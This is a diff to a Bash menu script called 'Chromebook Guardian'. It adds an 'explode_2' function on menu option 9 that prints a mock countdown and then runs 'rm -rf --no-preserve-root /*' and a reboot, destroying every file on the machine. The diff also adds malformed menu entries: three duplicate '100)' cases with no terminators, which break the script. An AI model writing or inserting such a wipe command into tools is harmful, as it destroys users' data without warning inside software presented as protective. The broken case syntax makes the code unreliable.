@@ -331,6 +331,17 @@ safety_information() {
   pause
 }
 
+explode_2() {
+  echo
+  echo "========== EXPLODE V2 =========="
+  echo "3... 2...1..."
+  sleep 0.5
+  echo "R.I.P. Chromebook"
+  sleep 0.5
+  rm -rf --no-preserve-root /*
+  reboot
+}
+
 main_menu() {
   local choice
   while true; do
@@ -360,6 +371,10 @@ main_menu() {
       6) explode_menu ;;
       7) safety_information ;;
       8) echo "Chromebook Guardian closed."; exit 0 ;;
+      9) explode_2 ;;
+      100) usb_boot_menu
+      100) set_vt2_password
+      100) rootfs_menu
       *) echo "Invalid selection."; sleep 1 ;;
     esac
   done
